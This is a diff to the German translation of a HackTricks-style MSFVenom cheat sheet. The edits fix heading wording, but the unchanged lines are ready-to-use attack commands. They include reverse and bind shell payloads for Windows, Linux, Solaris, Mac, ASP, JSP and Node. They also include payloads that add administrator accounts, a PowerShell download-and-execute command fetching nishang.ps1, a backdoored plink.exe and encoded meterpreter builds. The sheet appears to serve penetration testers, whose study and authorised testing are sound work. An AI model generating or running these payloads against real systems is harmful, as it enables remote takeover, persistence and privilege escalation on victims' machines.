@@ -1,21 +1,21 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Spickzettel
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## Grundlegendes zu msfvenom
+## Grundlegendes msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Man kann auch `-a` verwenden, um die Architektur anzugeben, oder `--platform`
+Man kann auch `-a` verwenden, um die Architektur oder die `--platform` anzugeben.
 
-## Auflistung
+## Auflisten
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Häufige Parameter beim Erstellen von Shellcode
+## Gängige Parameter beim Erstellen von Shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -37,11 +37,11 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### CMD-Shell
+### CMD Shell
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Befehl Ausführen**
+### **Befehl ausführen**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -50,11 +50,11 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Eingebettet in ausführbare Dateien
+### In eine ausführbare Datei eingebettet
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux-Payloads
+## Linux Payloads
 
 ### Reverse Shell
 ```bash
@@ -69,7 +69,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC-Payloads**
+## **MAC Payloads**
 
 ### **Reverse Shell:**
 ```bash
@@ -90,18 +90,18 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 ```
 ### ASP/x
 
-#### Reverse-Shell
+#### Reverse shell
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
 ### JSP
 
-#### Reverse-Shell
+#### Reverse shell
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
-### KRIEG
+### WAR
 
 #### Reverse Shell
 ```bash
@@ -111,7 +111,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Scriptsprachen-Payloads**
+## **Payloads in Skriptsprachen**
 
 ### **Perl**
 ```bash
